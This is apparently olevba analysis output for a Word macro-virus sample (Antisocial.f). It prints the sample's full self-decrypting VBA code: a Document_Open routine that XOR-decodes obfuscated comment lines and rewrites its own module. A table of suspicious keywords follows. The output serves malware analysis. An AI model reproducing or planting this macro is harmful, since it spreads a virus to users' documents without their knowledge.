olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Antisocial.f-ac9564c11c6a144e425e119da9b91d840502a654
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Antisocial.f-ac9564c11c6a144e425e119da9b91d840502a654 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open(): Application.EnableCancelKey = wdCancelDisabled
For d = 6 To 18: C$ = "": I = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(d, 1))
f = (Mid(I, 2, 1)): For X = 3 To Len(I): B$ = Asc(Mid(I, X, 1)) Xor f: C$ = C$ & Chr(B$): Next X: A = C$
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine d, A: Next d: Call ViewVBCode: End Sub
Private Sub ViewVBCode()
'7Hwsnhit)TfqbIhujfkWuhjws':'7
'3Lswjlmp-@lmejqn@lmufqpjlmp#>#39#Lswjlmp-UjqvpSqlwf`wjlm#>#3
'8[m|(KE(5(\`a{Lgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm
'7Tbs'FC':'FdsnqbChdrjbis)QEWuhmbds)QEDhjwhibist)Nsbj/6.)DhcbJhcrkb
'1Rdu!OU!<!Onsl`mUdlqm`ud/WCQsnkdbu/WCBnlqnodour/Hudl)0(/BnedLnetmd
'8Ngz(l(5(>(\g(902(K,(5(**2(A(5( KE&Dafm{ l$(9!!
'3e#>#Jmw+Qmg#)#;*#(#29#Elq#[#>#2#Wl#Ofm+J*9#A'#>#Bp`+Njg+J/#[/#2**#[lq#e9#@'#>#@'#%#@kq+A'*9#Mf{w#[9#B#>#@'
'5QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+W`uidf`Ilk`%a)%'"'%#%c%#%D?%K`}q%a
'7JD':'DJ)Knibt/6+'DJ)DhrisHaKnibt.
'1@E/EdmdudMhodr!0-!@E/BntouNgMhodr;!@E/@eeGsnlRushof!LB
'5KQ+A`i`q`Ilk`v%4)%KQ+FjpkqJcIlk`v?%KQ+DaaCwjhVqwlkb%HF
'4Egpmra@kgqiajp*WeraEw$BmhaJeia>9Egpmra@kgqiajp*BqhhJeia
'3$Bqafjwfq#Az#Ozp#Hluj`h---#Pv{lq#Nj#@l`hvp
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

